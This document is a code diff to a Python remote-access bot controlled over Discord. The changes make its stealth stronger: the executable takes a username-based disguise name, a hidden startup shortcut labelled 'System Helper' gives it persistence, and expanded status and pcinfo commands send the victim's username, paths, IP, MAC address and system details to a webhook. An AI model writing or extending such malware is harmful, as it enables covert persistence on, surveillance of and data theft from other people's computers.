@@ -48,13 +48,55 @@ shell_thread = None
 is_hidden = False
 original_filename = None
 hidden_paths = {}
-HIDE_NAME = "scvhost.exe"
 
-def add_to_startup(file_path):
+def get_username():
+    """Get the current Windows username"""
+    try:
+        return os.environ.get('USERNAME') or os.environ.get('USER') or getpass.getuser()
+    except:
+        return "user"
+
+def get_desktop_name():
+    """Get the current user's desktop name/folder path"""
+    try:
+        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+        if os.path.exists(desktop):
+            return desktop
+        desktop = os.path.join(os.environ['HOMEDRIVE'], os.environ['HOMEPATH'], 'Desktop')
+        if os.path.exists(desktop):
+            return desktop
+        return os.path.expanduser('~/Desktop')
+    except:
+        return os.path.expanduser('~/Desktop')
+
+def get_desktop_folder_name():
+    """Get just the folder name of the desktop"""
+    try:
+        desktop_path = get_desktop_name()
+        return os.path.basename(desktop_path)
+    except:
+        return "Desktop"
+
+def get_hide_name():
+    """Generate hide name using the actual Windows username"""
+    try:
+        username = get_username()
+        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
+        return f"{clean_username}_helper.exe"
+    except:
+        return "scvhost.exe"
+
+def add_to_startup(file_path, username=None):
+    """Add program to Windows startup using username in the shortcut"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
-        shortcut_path = os.path.join(startup_folder, "scvhost.lnk")
+        
+        if username is None:
+            username = get_username()
+        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
+        shortcut_name = f"{clean_username}_helper.lnk"
+        shortcut_path = os.path.join(startup_folder, shortcut_name)
         
         ps_script = f'''
         $WshShell = New-Object -comObject WScript.Shell
@@ -62,6 +104,7 @@ def add_to_startup(file_path):
         $Shortcut.TargetPath = "{file_path}"
         $Shortcut.WorkingDirectory = "{os.path.dirname(file_path)}"
         $Shortcut.WindowStyle = 7
+        $Shortcut.Description = "System Helper"
         $Shortcut.Save()
         '''
         subprocess.run(['powershell', '-command', ps_script], shell=True, capture_output=True)
@@ -70,9 +113,22 @@ def add_to_startup(file_path):
         return None
 
 def remove_from_startup():
+    """Remove program from Windows startup"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
+        
+        username = get_username()
+        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
+        
+        for item in os.listdir(startup_folder):
+            if item.lower().startswith(clean_username.lower()) and item.endswith('.lnk'):
+                try:
+                    os.remove(os.path.join(startup_folder, item))
+                    return True
+                except:
+                    pass
+        
         for item in os.listdir(startup_folder):
             if item.lower() == "scvhost.lnk":
                 try:
@@ -441,7 +497,11 @@ async def hide(ctx):
         script_dir = os.path.dirname(script_path)
         original_filename = os.path.basename(script_path)
         
-        new_path = os.path.join(script_dir, HIDE_NAME)
+        username = get_username()
+        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
+        hide_name = f"{clean_username}_helper.exe"
+        
+        new_path = os.path.join(script_dir, hide_name)
         
         if os.path.exists(new_path) and new_path != script_path:
             try:
@@ -451,19 +511,20 @@ async def hide(ctx):
         
         os.rename(script_path, new_path)
         hidden_paths['new_path'] = new_path
+        hidden_paths['hide_name'] = hide_name
         
         hide_file(new_path)
         hidden_paths['hidden'] = True
         
-        startup_path = add_to_startup(new_path)
+        startup_path = add_to_startup(new_path, username)
         if startup_path:
             hidden_paths['startup'] = startup_path
             hide_file(startup_path)
         
         is_hidden = True
         
-        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {HIDE_NAME}\nStartup added: Yes")
-        await ctx.send(f"Bot hidden successfully! Renamed to: {HIDE_NAME}")
+        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {hide_name}\nUsername: {username}\nStartup added: Yes")
+        await ctx.send(f"Bot hidden successfully! Renamed to: {hide_name}")
         
     except Exception as e:
         await ctx.send(f"Hide failed: {str(e)}")
@@ -507,12 +568,75 @@ async def unhide(ctx):
 
 @bot.command()
 async def status(ctx):
-    if is_hidden:
-        await ctx.send("Bot is currently HIDDEN as scvhost.exe")
-        await send_webhook("Status: Hidden as scvhost.exe")
-    else:
-        await ctx.send("Bot is NOT hidden")
-        await send_webhook("Status: Not hidden")
+    """Show detailed bot status including all directories and locations"""
+    try:
+        script_path = get_current_script_path()
+        script_dir = os.path.dirname(script_path)
+        script_name = os.path.basename(script_path)
+        username = get_username()
+        desktop_path = get_desktop_name()
+        startup_folder = os.path.join(os.environ['APPDATA'], 
+                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
+        
+        status_msg = f"""
+BOT STATUS REPORT
+====================
+Bot Name: {script_name}
+Bot Location: {script_path}
+Bot Directory: {script_dir}
+
+USER INFORMATION
+Username: {username}
+Desktop Path: {desktop_path}
+AppData Path: {os.environ.get('APPDATA', 'Unknown')}
+Temp Path: {os.environ.get('TEMP', 'Unknown')}
+
+HIDDEN STATUS
+Hidden: {is_hidden}
+Hidden Name: {hidden_paths.get('hide_name', 'None') if is_hidden else 'Not hidden'}
+New Path: {hidden_paths.get('new_path', 'None') if is_hidden else 'Not hidden'}
+
+STARTUP LOCATIONS
+Startup Folder: {startup_folder}
+
+STARTUP SHORTCUTS
+"""
+        # Check startup folder contents
+        try:
+            if os.path.exists(startup_folder):
+                startup_items = os.listdir(startup_folder)
+                if startup_items:
+                    status_msg += "Found shortcuts:\n"
+                    for item in startup_items:
+                        if item.endswith('.lnk'):
+                            status_msg += f"  - {item}\n"
+                else:
+                    status_msg += "No shortcuts found in startup folder\n"
+            else:
+                status_msg += "Startup folder not found\n"
+        except:
+            status_msg += "Unable to read startup folder\n"
+        
+        # Check if current file is hidden
+        try:
+            is_file_hidden = ctypes.windll.kernel32.GetFileAttributesW(script_path) & 2 != 0 if os.path.exists(script_path) else False
+            status_msg += f"\nFILE ATTRIBUTES\nCurrent file hidden: {is_file_hidden}\n"
+        except:
+            status_msg += "\nFILE ATTRIBUTES\nCurrent file hidden: Unable to check\n"
+        
+        status_msg += f"""
+SYSTEM INFO
+Platform: {platform.system()} {platform.release()}
+Architecture: {platform.machine()}
+Python Version: {platform.python_version()}
+        """
+        
+        await ctx.send(f"```\n{status_msg}\n```")
+        await send_webhook(f"**STATUS REPORT**\n```\n{status_msg}\n```")
+        
+    except Exception as e:
+        await ctx.send(f"Status check failed: {str(e)}")
+        await send_webhook(f"Status error: {str(e)}")
 
 @bot.command()
 async def install(ctx, *, package):
@@ -558,6 +682,7 @@ async def pcinfo(ctx):
         version = platform.version()
         machine = platform.machine()
         processor = platform.processor()
+        desktop_path = get_desktop_name()
         
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
         
@@ -565,7 +690,7 @@ async def pcinfo(ctx):
         if platform.system() == "Windows":
             win_ver = f"Windows Version: {platform.win32_ver()[0]} {platform.win32_ver()[1]}"
         
-        output = f"Hostname: {hostname}\nUsername: {username}\nIP Address: {ip}\nOS: {system} {release}\n{win_ver}\nOS Version: {version}\nArchitecture: {machine}\nProcessor: {processor}\nMAC Address: {mac}"
+        output = f"Hostname: {hostname}\nUsername: {username}\nIP Address: {ip}\nOS: {system} {release}\n{win_ver}\nOS Version: {version}\nArchitecture: {machine}\nProcessor: {processor}\nMAC Address: {mac}\nDesktop Path: {desktop_path}"
         
         await send_webhook(f"**PC INFORMATION**\n```\n{output}\n```")
         await ctx.send("PC information sent to webhook.")
